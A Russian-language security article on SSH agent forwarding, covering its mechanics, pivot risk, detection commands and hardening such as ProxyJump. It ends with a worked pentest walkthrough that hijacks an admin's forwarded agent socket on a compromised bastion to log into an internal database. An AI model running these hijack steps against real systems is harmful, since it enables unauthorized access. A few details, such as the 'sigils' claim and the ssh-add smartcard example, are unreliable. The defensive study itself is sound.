# SSH Agent Forwarding: Архитектура, Риски Пивота и Методы Детекции

## Контекст и базовые понятия

SSH Agent Forwarding (AF) — это механизм протокола Secure Shell (SSH), позволяющий клиенту перенаправлять сокет Unix-domain своего локального `ssh-agent` на удаленный сервер. Этот механизм предназначен для упрощения аутентификации в цепочке хостов (jump hosts / bastion hosts). Вместо того чтобы копировать закрытые ключи на промежуточные серверы, клиент делегирует удаленному серверу право запрашивать подписи у локального агента. Удаленный сервер выступает в роли прокси: он получает запрос на аутентификацию от следующей цели, отправляет его обратно через зашифрованный SSH-туннель клиенту, клиент подписывает запрос локальным ключом и возвращает подпись.

Ключевое разграничение заключается в том, что сам закрытый ключ никогда не покидает память локального агента. Однако, если промежуточный сервер скомпрометирован, злоумышленник с правами root может получить доступ к файлу сокета агента и использовать его для аутентификации от имени пользователя до тех пор, пока действует SSH-сессия. Это создает риск горизонтального перемещения (lateral movement) внутри сети.

В контексте тестирования на проникновение и защиты инфраструктуры необходимо четко разграничивать три концепции, которые часто путают:

1.  **SSH Agent Forwarding (AF):** Делегирование прав аутентификации. Позволяет использовать локальные ключи на удаленном хосте для подключения к третьему хосту.
2.  **SSH Port Forwarding (Tunneling):** Перенаправление сетевого трафика. Создает туннель для передачи произвольного TCP-трафика (например, RDP, VNC, базы данных) через SSH-соединение.
3.  **SSH Agent Hijacking:** Эксплуатация скомпрометированного агента. Действие злоумышленника, который получает доступ к сокету агента на скомпрометированном хосте и использует его для пивота.

Путаница между этими понятиями приводит к ошибкам в конфигурации политик безопасности. Запрет AF не защищает от перехвата трафика через Port Forwarding, а настройка Port Forwarding не предотвращает кражу ключей через AF.

| Характеристика | SSH Agent Forwarding (AF) | SSH Port Forwarding (Local/Remote) | SSH Agent Hijacking |
| :--- | :--- | :--- | :--- |
| **Основная функция** | Делегирование аутентификации (подписи ключей) | Перенаправление сетевого трафика (TCP/UDP) | Эксплуатация скомпрометированного состояния агента |
| **Уровень работы** | Уровень приложения (SSH protocol layer) | Уровень сети (TCP/IP) | Уровень ОС (Filesystem/Process) |
| **Риск для ключей** | Ключи не копируются, но используются удаленно | Ключи не затрагиваются напрямую | Ключи не копируются, но используются удаленно |
| **Типичное применение** | Подключение через Jump Host к внутренним серверам | Доступ к базам данных, RDP, VNC через бастуон | Пост-эксплуатация после получения root на прокси-хосте |
| **Механизм детекции** | Логи `sshd` (ForwardAgent), аудит процессов | Сетевой трафик, логи `sshd` (Tunnel) | Аномалии в использовании сокетов, доступ к `/tmp` |

Архитектурно SSH Agent Forwarding опирается на переменную окружения `SSH_AUTH_SOCK`, которая указывает путь к сокету агента. При использовании флага `-A` клиент SSH устанавливает эту переменную на удаленной машине, указывая на сокет, который перенаправляется через защищенный канал. Это позволяет любому процессу на удаленной машине, имеющему права на чтение/запись к этому сокету, взаимодействовать с агентом как с локальным.

## Внутреннее устройство механизма и риски пивота

Механизм SSH Agent Forwarding базируется на протоколе SSH2 и спецификации RFC 4254. Понимание его внутреннего устройства критично для оценки рисков.

### Архитектура перенаправления сокета

Когда клиент SSH запускается с флагом `-A` (или опцией `ForwardAgent yes` в `~/.ssh/config`), он выполняет следующие действия:

1.  **Инициализация:** Клиент проверяет наличие запущенного `ssh-agent` и переменную `SSH_AUTH_SOCK`.
2.  **Создание удаленного сокета:** На стороне сервера (`sshd`) создается временный сокет Unix-domain (обычно в `/tmp` или `/run/user/<uid>/`).
3.  **Настройка окружения:** `sshd` устанавливает переменную `SSH_AUTH_SOCK` в окружение новой сессии пользователя, указывая на созданный удаленный сокет.
4.  **Перенаправление:** Все обращения к этому сокету внутри сессии пользователя перенаправляются через зашифрованный туннель обратно на клиентский сокет.

```text
[Клиент (Local)]                          [Промежуточный сервер (Jump)]
+---------------------+                   +---------------------------+
| ssh-agent           |                   | sshd (SSH Daemon)         |
| (Socket: /tmp/ssh- |                   |                           |
| 12345/agent.1234)  |◀──(Туннель)──────▶| (Socket: /tmp/ssh-        |
+---------------------+   SSH Protocol    | 67890/agent.6789)         |
      ▲                                     |                           |
      |                                     +------------+--------------+
      | SSH Agent Protocol                      ▲
      | (Sign Request)                          |
      +-----------------------------------------+
      (Запрос подписи от имени пользователя)
```

### Риски пивота (Lateral Movement)

Риск заключается в том, что на промежуточном сервере любой процесс, имеющий права на чтение и запись к файлу сокета агента, может отправлять запросы на подпись. В Unix-системах это означает, что пользователь с правами `root` или процесс, работающий от имени `root` (например, скрипты мониторинга, бэкапа или компрометированный сервис), может использовать ключи.

**Сценарий эксплуатации:**
1.  Администратор подключается к Jump Server с флагом `-A`.
2.  Jump Server скомпрометирован (например, через веб-уязвимость).
3.  Атакующий получает доступ к файлу сокета: `ls -l /tmp/ssh-*/agent.*`.
4.  Атакующий устанавливает переменную окружения `SSH_AUTH_SOCK` на путь к этому сокету.
5.  Атакующий выполняет `ssh-add -l` или `ssh user@internal-db`, используя ключи администратора.

**Критические уязвимости реализации:**

*   **Отсутствие подтверждения пользователя:** В отличие от локального использования, где пользователь может быть запрошен (через `ssh-askpass` или FIDO2), при перенаправлении запрос приходит от имени удаленного процесса. Если агент настроен на автоматическую подпись (например, для сервисных аккаунтов), атакующий получает полный доступ без каких-либо интерактивных проверок.
*   **Временная экспозиция:** Ключи остаются доступными до завершения SSH-сессии. Если сессия долгоживущая (например, `screen` или `tmux` сессия), окно экспозиции расширяется.
*   **Spoofing атаки:** В некоторых старых реализациях или при неправильной настройке клиент может принять запрос от несанкционированного агента. Современные клиенты (OpenSSH >= 7.2) используют "sigils" (сигналы) для защиты от спуфинга, но это работает только если клиент доверяет агенту на удаленной машине, что противоречит модели безопасности.

### Сравнение методов аутентификации в цепочке

| Метод | Безопасность ключей | Удобство | Риск пивота |
| :--- | :--- | :--- | :--- |
| **Копирование ключей** | Низкий (ключи на диске) | Низкий | Высокий (кража файлов) |
| **Пароли** | Средний (передаются по туннелю) | Средний | Низкий (требует ввода) |
| **SSH Agent Forwarding** | Высокий (ключи не покидают RAM) | Высокий | Средний/Высокий (компрометация хоста) |
| **ProxyJump (`ProxyJump`)** | Высокий (нет AF) | Высокий | Низкий (клиент сам шлюз) |

`ProxyJump` (SSH Config `ProxyJump`) является современной альтернативой `-A`. Он не перенаправляет сокет агента. Вместо этого клиент SSH сам устанавливает соединение до конечной цели, используя ключи локально. Это устраняет риск пивота через AF, так как промежуточный сервер не имеет доступа к сокету агента. Однако `ProxyJump` требует, чтобы клиент имел сетевой доступ ко всем хостам в цепочке, что не всегда возможно в изолированных сегментах.

## Применение и работа с предметом

На практике SSH Agent Forwarding используется в двух основных сценариях: администрирование через bastion hosts и автоматизация CI/CD. Понимание того, как работают инструменты детекции и защиты, критично для специалистов по информационной безопасности.

### Инструментарий и команды анализа

Для аудита использования AF и выявления рисков необходимо использовать следующие инструменты и команды.

**1. Проверка активных перенаправлений агента:**

```bash
# Проверка, какие сессии имеют активное перенаправление агента
ss -x | grep ssh-agent

# Или через ps и environ
ps aux | grep ssh
# Затем проверить окружение процесса
cat /proc/<PID>/environ | tr '\0' '\n' | grep SSH_AUTH_SOCK
```

**2. Аудит конфигурации SSH:**

```bash
# Проверка глобальной конфигурации сервера
grep -i "allowagentforwarding" /etc/ssh/sshd_config

# Проверка пользовательской конфигурации
grep -i "forwardagent" ~/.ssh/config
```

**3. Детекция компрометации агента (на стороне жертвы):**

Если администратор подозревает, что его ключи могли быть скомпрометированы, он должен проверить, не было ли несанкционированных запросов на подпись. Однако, стандартные логи `sshd` не фиксируют запросы на подпись, отправленные через агент. Поэтому детекция должна быть основана на аномалиях в использовании сокетов.

```bash
# Мониторинг доступа к сокету агента в реальном времени
auditctl -w /tmp/ssh-*/agent.* -p rw -k ssh_agent_access
```

### Паттерны защиты и конфигурации

**1. Отключение Agent Forwarding на серверах:**

В `sshd_config` на всех серверах, кроме строго необходимых bastion hosts, следует явно запретить перенаправление агента:

```ssh
# /etc/ssh/sshd_config
AllowAgentForwarding no
```

**2. Использование `ProxyJump` вместо `-A`:**

Вместо подключения к Jump Host с `-A` и затем к цели, клиент должен использовать:

```ssh
# ~/.ssh/config
Host bastion
    HostName bastion.example.com
    User admin

Host internal-db
    HostName 10.0.0.5
    User dbadmin
    ProxyJump bastion
```

Это обеспечивает тот же функционал, но без риска пивота через AF.

**3. Изоляция агентов (Key Separation):**

Использование разных ключей для разных сред. Если ключ для production скомпрометирован через AF, он не дает доступа к staging или personal аккаунтам.

```bash
# Добавление ключа с ограничением
ssh-add -s /usr/libexec/openssh/ssh-keysign -D # Пример использования smartcard или TPM
```

### Типичные ошибки и подводные камни

*   **Доверие к скриптам бэкапа:** Скрипты бэкапа, работающие от root, могут читать сокет агента. Если администратор подключился к серверу бэкапа с `-A`, ключи экспонированы.
*   **Контейнеризация:** При запуске контейнеров с перенаправлением сокетов (`-v /tmp/ssh-agent:/tmp/ssh-agent`) контейнер получает полный доступ к ключам хоста.
*   **Сессии `screen`/`tmux`:** Если сессия не завершена, сокет остается активным. Удаление сессии не всегда освобождает сокет, если процесс `sshd` все еще держит дескриптор.

## Сквозной практический пример: Аудит и эксплуатация SSH Agent Forwarding

**Исходные условия:**
*   **Среда:** Корпоративная Linux-инфраструктура с Bastion Host (192.168.1.10) и внутренней базой данных (10.0.0.50).
*   **Роль:** Пентестер, получивший доступ к Bastion Host через веб-уязвимость.
*   **Цель:** Получить доступ к внутренней БД, используя ключи администратора, которые были загружены в `ssh-agent` на локальной машине администратора при подключении к Bastion.

**Шаг 1: Разведка и поиск активных сессий SSH**

Пентестер анализирует процессы на Bastion Host, чтобы найти пользователей, использующих SSH Agent Forwarding.

```bash
# Поиск процессов sshd, работающих от имени пользователей
ps aux | grep sshd | grep -v "sshd:"

# Вывод (иллюстративный):
# admin     1234  0.0  0.1  12345  6789 ?        Ss   10:00   0:00 sshd: admin@pts/0
# admin     1235  0.0  0.1  12345  6789 pts/0    Ss   10:00   0:00 sshd: admin@notty
```

**Шаг 2: Идентификация сокета агента**

Пентестер проверяет окружение процесса `sshd` для пользователя `admin`, чтобы найти переменную `SSH_AUTH_SOCK`.

```bash
# Чтение окружения процесса sshd (требуются права root)
cat /proc/1235/environ | tr '\0' '\n' | grep SSH_AUTH_SOCK

# Вывод (иллюстративный):
# SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.1235
```

**Шаг 3: Проверка доступа к сокету**

Пентестер проверяет права доступа к найденному сокету.

```bash
ls -l /tmp/ssh-XXXXXX/agent.1235

# Вывод (иллюстративный):
# srwx------ 1 admin admin 0 Apr 29 10:00 /tmp/ssh-XXXXXX/agent.1235
```

*Анализ:* Сокет принадлежит пользователю `admin` и имеет права `srwx------`. Если пентестер работает от имени `root`, он может читать и писать в этот сокет.

**Шаг 4: Эксплуатация (Использование ключей администратора)**

Пентестер устанавливает переменную окружения на путь к сокету и пытается подключиться к внутренней БД.

```bash
# Установка переменной окружения
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.1235

# Проверка доступных ключей
ssh-add -l

# Вывод (иллюстративный):
# 4096 SHA256:randomhash admin@laptop (RSA)

# Попытка подключения к внутренней БД
ssh admin@10.0.0.50

# Результат:
# Welcome to Ubuntu 20.04 LTS
# admin@internal-db:~$
```

**Ожидаемый вывод:**
Пентестер успешно получил доступ к внутренней БД, используя ключи администратора, не зная пароля от ключа. Это демонстрирует риск пивота через SSH Agent Forwarding.

## Аналитический вывод

SSH Agent Forwarding представляет собой компромисс между удобством администрирования и риском горизонтального перемещения. Механизм позволяет использовать локальные ключи на удаленных хостах без их копирования, что повышает безопасность по сравнению с хранением ключей на диске. Однако, он создает критическую уязвимость: если промежуточный хост скомпрометирован, злоумышленник с правами root может использовать сокет агента для аутентификации от имени пользователя. Это особенно опасно в средах с привилегированными скриптами (бэкап, мониторинг), которые могут читать сокет.

Современные практики безопасности рекомендуют минимизировать использование `-A` и переходить на `ProxyJump` или `ProxyCommand`, которые не экспонируют сокет агента на промежуточных хостах. Для детекции атак на основе AF необходимо внедрять аудит доступа к сокетам (`auditd`) и мониторинг аномалий в использовании SSH-сессий. В условиях, где `-A` неизбежен, следует использовать изоляцию ключей (разные ключи для разных сред) и ограничивать доступ к сокетам только доверенными процессами.
